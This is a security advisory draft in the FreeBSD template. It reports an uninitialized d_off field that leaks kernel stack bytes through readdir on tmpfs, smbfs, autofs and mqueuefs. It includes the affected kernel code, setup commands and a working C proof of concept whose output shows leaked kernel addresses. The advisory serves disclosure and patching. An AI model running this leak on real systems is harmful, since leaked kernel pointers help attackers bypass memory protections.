=============================================================================
FreeBSD-SA-ADVISORY_TEMPLATE                                Security Advisory
                                                          The FreeBSD Project

Topic:          Kernel stack disclosure in MQUEUEFS/TMPFS/SMBFS/AUTOFS

Category:       core
Module:         Kernel
Announced:      2020-XX-XX
Credits:        Syed Faraz Abrar of elttam
Affects:        All supported versions of FreeBSD
Corrected:      2020-XX-XX XX:XX:XX UTC (stable/12, 12.2-STABLE)
                2020-XX-XX XX:XX:XX UTC (releng/12.2, 12.2-RELEASE-pXX)
                2020-XX-XX XX:XX:XX UTC (releng/12.1, 12.1-RELEASE-pXX)
                2020-XX-XX XX:XX:XX UTC (stable/11, 11.4-STABLE)
                2020-XX-XX XX:XX:XX UTC (releng/11.4, 11.4-RELEASE-pXX)
CVE Name:       CVE-XXXX-XXXX

For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit <URL:https://security.FreeBSD.org/>.

I.   Background

There exists implementations for POSIX Message Queue File System (MQUEUEFS),
Temporary File System (TMPFS), Server Message Block File System (SMBFS), and
Auto File System (AUTOFS) in the FreeBSD kernel. These implementations are used
whenever a file system of the corresponding type is accessed. 

Note that although none of these file systems are enabled by default, the TMPFS
file system in particular is very widely used, so it would not be surprising to
see it enabled.

II.  Problem Description

Multiple instances of the same bug causes up to 8 bytes of uninitialized kernel
stack memory to be leaked to the userland through an uninitialized directory
entry offset. This data can be viewed by any user with read access to the file
system.

III. Impact

Uninitialized kernel stack memory is disclosed to the userland.

IV.  Workaround

No workaround is available, but systems not using MQUEUEFS/TMPFS/SMBFS/AUTOFS
are not affected.

V.   Details of the vulnerability

The `dirent` structure can be seen below:

```
struct dirent {                                                                 
    ino_t      d_fileno;        /* file number of entry */                      
    off_t      d_off;       /* directory offset of entry */                     
    __uint16_t d_reclen;        /* length of this record */                     
    __uint8_t  d_type;      /* file type, see below */                          
    __uint8_t  d_pad0;                                                          
    __uint16_t d_namlen;        /* length of string in d_name */                
    __uint16_t d_pad1;                                                          
#if __BSD_VISIBLE                                                               
#define MAXNAMLEN   255                                                         
    char    d_name[MAXNAMLEN + 1];  /* name must be no longer than this */      
#else                                                                           
    char    d_name[255 + 1];    /* name must be no longer than this */          
#endif                                                                          
};
```

The root cause of the bug is simple. The following list of functions allocate a
`struct dirent` object on the stack, but fail to initialize the `d_off` field
before copying the object's data out to the userland:

* `tmpfs_dir_getdotdent`
* `tmpfs_dir_getdotdotdent`
* `smbfs_readvdir`
* `autofs_readdir_one`
* `mqfs_readdir`

I will only detail one instance of this bug below. The root cause is always the
same, so the fix is to initialize the `d_off` field of the `struct dirent` stack
object before copying it out to the userland in all of the functions listed
above.

The `tmpfs_dir_getdotdent` function is called by `tmpfs_dir_getdents` which is
further called by `tmpfs_readdir`. The function is very short:

```
static int
tmpfs_dir_getdotdent(struct tmpfs_mount *tm, struct tmpfs_node *node,
    struct uio *uio)
{
	int error;
	struct dirent dent;

	TMPFS_VALIDATE_DIR(node);
	MPASS(uio->uio_offset == TMPFS_DIRCOOKIE_DOT);

	dent.d_fileno = node->tn_id;
	dent.d_type = DT_DIR;
	dent.d_namlen = 1;
	dent.d_name[0] = '.';
	dent.d_reclen = GENERIC_DIRSIZ(&dent);
	dirent_terminate(&dent);

	if (dent.d_reclen > uio->uio_resid)
		error = EJUSTRETURN;
	else
		error = uiomove(&dent, dent.d_reclen, uio);

	tmpfs_set_status(tm, node, TMPFS_NODE_ACCESSED);

	return (error);
}
```

It is immediately evident that the `d_off` field of the struct has not been
initialized. `dirent_terminate` will only zero out the padding bytes and the
remainder of the `d_name` field. The struct is then copied out to the userland
through `uiomove`.

VI.  Proof of Concept

First, the TMPFS kernel module needs to be loaded, and then a TMPFS file system
needs to be mounted. Note that the following commands will require root
privileges to load the kernel module and mount the file system, but as mentioned
previously, it is very normal for a machine running FreeBSD to have the TMPFS
kernel module loaded, and the TMPFS file system mounted.

Run the following commands to load the kernel module and mount a TMPFS file
system:

```
$ sudo kldload tmpfs
$ mkdir ./temp
$ sudo mount -t tmpfs null ./temp
```

Then, the proof of concept shown below will demonstrate the vulnerability.
Compile it with `clang poc.c`, and run it in the same directory as the mounted
file system above.

```
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    struct dirent *dp;
    DIR *dirp;

    while (1) {
        dirp = opendir("./temp");
        if (dirp == NULL) {
            perror("opendir");
            exit(1);
        }

        dp = readdir(dirp);

        if (dp->d_off != 0) {
            printf("%lx\n", dp->d_off);
        }

        (void)closedir(dirp);
    }
}
```

Output:

```
$ ./a.out 
1
fffff800058fd000
fffff800058fd5a0
80000000031ae001
ffffffff81c0f594
ffffffff829fbeb8
fffffe0000510338
fffff800058fd5a0
fffffe0000510328
ffffffff828d4c20
fffffe0000510338
1000000000040f8
fffffe0000510318
ffffffff8122ba79
fffff80005a2e138
ffffffff81bad8bb
```
